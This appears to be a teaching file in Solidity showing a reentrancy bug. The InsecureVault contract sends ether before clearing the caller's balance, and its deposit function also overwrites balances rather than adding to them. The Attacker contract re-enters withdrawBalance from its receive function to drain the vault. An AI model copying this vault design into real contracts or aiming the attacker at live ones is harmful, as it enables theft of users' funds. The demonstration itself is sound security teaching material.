// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

contract InsecureVault {
    mapping(address => uint) private userBalances;

    constructor() public payable {
        userBalances[msg.sender] = msg.value;
    }

    function deposit() external payable {
        userBalances[msg.sender] = msg.value;
    }

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];
        (bool success, ) = msg.sender.call{value: amountToWithdraw}(""); // At this point, the caller's code is executed, and can call withdrawBalance again

        require(success);
        userBalances[msg.sender] = 0;
    }
}

contract Attacker {
    InsecureVault target;

    constructor(InsecureVault _target) public {
        target = _target;
    }

    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdrawBalance();
        }
    }

    function exploit() external payable {
        require(msg.value == 1 ether, "Require 1 ether to attack");
        target.deposit{value: 1 ether}();
        target.withdrawBalance();
    }
}
